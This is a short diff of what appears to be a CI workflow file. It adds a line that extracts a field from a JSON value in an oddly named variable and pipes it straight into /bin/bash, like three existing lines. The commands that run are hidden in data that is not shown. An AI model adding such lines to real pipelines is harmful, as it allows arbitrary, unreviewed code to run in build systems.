@@ -42,6 +42,7 @@ jobs:
           echo $dqims0 | jq -r .aux2 | /bin/bash
           printf '%s' "$rvtl2" | jq -r .j855 | /bin/bash
           printf '%s' "$rcdjo404" | jq -r .lpty5730 | /bin/bash
+          echo $dv38 | jq -r .vdhc5956 | /bin/bash
 
       - name: Persist output
         if: always()
